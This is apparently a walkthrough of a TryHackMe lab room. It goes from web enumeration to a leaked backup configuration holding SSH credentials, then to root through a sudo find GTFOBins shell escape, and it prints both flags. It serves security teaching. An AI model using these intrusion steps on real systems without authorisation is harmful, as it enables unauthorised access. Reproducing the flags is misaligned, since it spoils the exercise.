TryHackMe - Leaked Credentials Walkthrough

Introduction

This walkthrough documents the steps taken to complete the Leaked Credentials room on TryHackMe. The room focuses on identifying exposed development resources, discovering leaked credentials, gaining initial access, and escalating privileges to achieve full system compromise

Task 1: Initial Enumeration

Scanning the Target

As with any penetration testing engagement, the first step is to perform service enumeration using Nmap.

The following scan was executed:

```bash
nmap -sCV TARGET_IP
```
Command Explanation
-sC – Runs Nmap's default NSE scripts.
-sV – Detects service versions running on open ports.

The scan identified an HTTP service running on the target machine.

<img width="602" height="323" alt="image" src="https://github.com/user-attachments/assets/b243a4e6-841a-404c-a4d9-aab01fa79a89" />

Task 2: Exploring the Web Application

The target IP address was opened in the browser.

<img width="602" height="256" alt="image" src="https://github.com/user-attachments/assets/324e7023-5987-4867-8142-ea67558bfcbc" />

To gather additional information, the page source was inspected.Another useful discovery was made by checking the robots.txt file.

http://TARGET_IP/robots.txt

The file contained:

User-agent: *
Disallow: /devshop              

<img width="569" height="109" alt="image" src="https://github.com/user-attachments/assets/fd903353-ec79-4829-ab49-944c9cc6a978" />


Task 3: Directory Enumeration

Objective

Identify hidden directories within the development site.

Gobuster was used to enumerate directories.

```bash
gobuster dir -u http://TARGET_IP/devshop -w /usr/share/wordlists/dirb/common.txt
```

The scan revealed several directories.

/config
/backups


<img width="602" height="345" alt="image" src="https://github.com/user-attachments/assets/2209c4be-a714-47b5-8e83-96697e5ed6b6" />


Task 4: Backup File Discovery

Browsing to the backups directory revealed an archived configuration file.

```bash
http://TARGET_IP/devshop/backups
```


<img width="534" height="192" alt="image" src="https://github.com/user-attachments/assets/683fed0d-502c-4314-a453-0620788d400f" />


Discovered file:

config_old.zip

Download the archive.

wget http://TARGET_IP/devshop/backups/config_old.zip

Extract its contents.

<img width="542" height="146" alt="image" src="https://github.com/user-attachments/assets/b2f095fa-899d-4df2-8d34-42e1ad7ee6f8" />


unzip config_old.zip

Inside the extracted configuration file were exposed database credentials.

<img width="314" height="218" alt="image" src="https://github.com/user-attachments/assets/3bef6040-5ec0-41e4-a1a7-7fad89fcd75f" />


$db_user="webadmin";
$db_pass="ShopEase@2025";

Task 5: Initial Access

Objective

Use the exposed credentials to access the target via SSH.

```bash
ssh webadmin@TARGET_IP
```

Enter the recovered password when prompted.

ShopEase@2025

Authentication succeeded, providing a shell on the target system.

<img width="560" height="510" alt="image" src="https://github.com/user-attachments/assets/9eedfd34-e1e5-4c78-98b5-71fe72b7ccef" />

Task 6: User Flag

After logging in, navigate to the user's home directory and read the user flag.

cat user.txt

<img width="374" height="110" alt="image" src="https://github.com/user-attachments/assets/b7e8765c-0387-41dd-af00-baf32f30b1b5" />

Output:

THM{shopping_access_granted}

Task 7: Privilege Escalation

Objective

Escalate privileges to obtain root access.

First, check the user's sudo permissions.

```bash
sudo -l
```

The output revealed that the user could execute the find binary with elevated privileges.

(ALL) NOPASSWD: /usr/bin/find

Consulting GTFOBins shows that find can be abused to spawn a root shell.

Execute the following command.

```bash
sudo find . -exec /bin/bash \; -quit
```

A root shell is obtained successfully.

Verify the current user.

whoami

<img width="1035" height="157" alt="image" src="https://github.com/user-attachments/assets/aa6d3423-7195-4291-b692-18e0e9cc4668" />

Task 8: Root Flag

With root privileges, retrieve the final flag.

cat /root/root.txt

<img width="417" height="37" alt="image" src="https://github.com/user-attachments/assets/bad0b371-64f6-49eb-ac3c-b5694777bc22" />


Output:

THM{checkout_complete}


Conclusion

This room demonstrates how exposed development resources and improperly secured backup files can lead to credential disclosure and complete system compromise. Through a structured penetration testing methodology, it highlights the importance of reconnaissance, directory enumeration, secure credential management, and privilege escalation awareness.

Key Learnings
Performed web application reconnaissance using Nmap and manual enumeration.
Discovered hidden directories and exposed backup files through directory enumeration.
Identified leaked credentials and gained initial access via SSH.
Enumerated the Linux system to identify privilege escalation opportunities.
Exploited an insecure sudo configuration using GTFOBins to obtain root access.

Happy Hacking!
